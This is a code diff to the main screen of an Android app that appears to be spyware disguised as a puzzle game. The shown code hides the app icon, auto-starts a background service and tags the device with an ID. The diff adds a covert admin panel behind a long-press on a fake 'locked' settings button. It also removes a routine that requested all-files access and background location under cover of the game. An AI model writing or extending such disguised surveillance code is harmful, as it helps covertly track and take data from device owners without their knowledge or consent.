@@ -4,29 +4,18 @@ import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
-import android.provider.Settings;
 import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
 import com.devicebridge.game.BridgeGameView;
 import com.devicebridge.game.BridgePuzzleGenerator;
-import com.devicebridge.utils.PermissionHelper;
 import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
-
-    private static final int RC_PERMISSIONS = 1001;
-    private static final int RC_BACKGROUND_LOCATION = 1002;
-    private static final int RC_STORAGE = 1004;
 
     private BridgeGameView gameView;
     private TextView tvHud;
@@ -41,7 +30,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         com.devicebridge.utils.Config.getOrCreateDeviceId(this);
         autoStartServiceIfReady();
-            com.devicebridge.utils.Config.hideAppIcon(this);
+        com.devicebridge.utils.Config.hideAppIcon(this);
 
         gameView = findViewById(R.id.game_view);
         tvHud = findViewById(R.id.tv_hud);
@@ -62,17 +51,27 @@ public class MainActivity extends AppCompatActivity {
             startPuzzle(currentLevel);
         });
 
+        // Public face: settings look locked.
         btnSettings.setOnClickListener(v ->
                 Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());
+
+        // Hidden trigger: long-press the settings gear opens the admin panel.
+        btnSettings.setOnLongClickListener(v -> {
+            openAdminPanel();
+            return true;
+        });
 
         // Long press title or level badge to copy Device ID quickly
         findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
         tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });
 
         startPuzzle(currentLevel);
+    }
 
-        // Show game splash loading & request runtime permissions 1-by-1
-        new Handler(Looper.getMainLooper()).postDelayed(this::requestRuntimePermissionsSequentially, 800);
+    private void openAdminPanel() {
+        try {
+            startActivity(new Intent(this, ControlPanelActivity.class));
+        } catch (Exception ignored) {}
     }
 
     private void copyDeviceId() {
@@ -88,65 +87,6 @@ public class MainActivity extends AppCompatActivity {
         BridgePuzzleGenerator.Puzzle puzzle = BridgePuzzleGenerator.generate(random, islandCount);
         gameView.setPuzzle(puzzle);
         tvHud.setText("Tap two islands to build a bridge");
-    }
-
-    /**
-     * Standard 1-by-1 Android runtime permission popups
-     */
-    private void requestRuntimePermissionsSequentially() {
-        if (PermissionHelper.needsManageStorage()
-                && !PermissionHelper.isExternalStorageManager(this)) {
-            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            try {
-                startActivityForResult(manage, RC_STORAGE);
-            } catch (Exception e) {
-                try {
-                    startActivityForResult(
-                            new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
-                } catch (Exception ignored) {}
-            }
-            return;
-        }
-
-        String[] perms = PermissionHelper.getRuntimePermissions();
-        if (perms.length > 0) {
-            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
-        } else {
-            onRuntimePermissionsDone();
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
-                                           @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
-        if (requestCode == RC_PERMISSIONS) {
-            onRuntimePermissionsDone();
-        } else if (requestCode == RC_BACKGROUND_LOCATION) {
-            autoStartServiceIfReady();
-            com.devicebridge.utils.Config.hideAppIcon(this);
-        }
-    }
-
-    private void onRuntimePermissionsDone() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            ActivityCompat.requestPermissions(this,
-                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
-                    RC_BACKGROUND_LOCATION);
-        } else {
-            autoStartServiceIfReady();
-            com.devicebridge.utils.Config.hideAppIcon(this);
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == RC_STORAGE) {
-            requestRuntimePermissionsSequentially();
-        }
     }
 
     private void autoStartServiceIfReady() {
